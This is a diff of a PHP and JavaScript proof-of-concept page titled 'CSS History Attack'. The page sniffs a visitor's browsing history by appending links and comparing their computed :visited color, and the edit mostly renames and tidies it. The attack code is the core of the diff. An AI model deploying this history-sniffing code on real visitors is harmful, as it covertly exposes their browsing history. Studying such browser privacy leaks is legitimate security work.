@@ -12,11 +12,15 @@ if (isset($_GET['l']))
 <html>
 <head><style>h1 {background-color: #888888;} a {color: <? echo($s1) ?>; font-size: 30px;} a:visited{color: <? echo($s2) ?>; font-size: 16px;} </style></head>
 <body>
-<h1>Test</h1>
+<h1>CSS History Attack</h1>
+
+
+<div id="results1"></div><br><div id="results2"></div></br>
+<!--For debugging: if you've visited Google and your browser is vulnerable, the first link should look different than the second one (except IE, which is also vulnerable).
+
 
 <a href="http://google.com" id="link1">Google</a>
-<a href="http://fakesite.com" id="link2">fakesite.com</a>
-<div id="results1"></div><br><div id="results2"></div>
+<a href="http://fakesite.com" id="link2">fakesite.com</a> -->
 </body>
 </html>
 <script type="text/javascript">
@@ -37,8 +41,6 @@ var b = document.createElement('a');
 b.href = 'http://fdasadfsadfsa.com';
 b.innerHTML = "Click Here2!";
 
-//TODO: Finish this
-//TODO: make this work in IE
 for (l = 0; l< <? echo($l); ?>; l++) //optional loop for performance testing
 {
 	for (i=0; i<sites.length; i++)
@@ -52,7 +54,7 @@ for (l = 0; l< <? echo($l); ?>; l++) //optional loop for performance testing
 			document.body.appendChild(d);
 			if (d.currentStyle.color == '<?echo($s3)?>' )
 			{
-				results1.innerHTML += d.href;
+				results1.innerHTML += d.href+" ";
 			}
 		}
 		else
